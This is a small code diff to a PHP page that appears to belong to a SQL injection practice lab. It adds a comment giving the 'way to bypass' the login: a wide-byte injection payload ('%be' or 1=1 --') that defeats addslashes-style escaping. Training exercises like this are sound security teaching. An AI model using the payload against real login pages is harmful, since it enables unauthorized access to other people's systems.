@@ -69,6 +69,11 @@
         echo '<h1>sql injection success</h1>';
         echo "<a href='../html/login_impossible.html'>下一关</a>";
     }
+
+    /**
+     * the way to bypass
+     * result_addsls.php?username=renxujie%be' or 1=1 -- %23&password=anything
+     */
 ?>
 </body>
 </html>
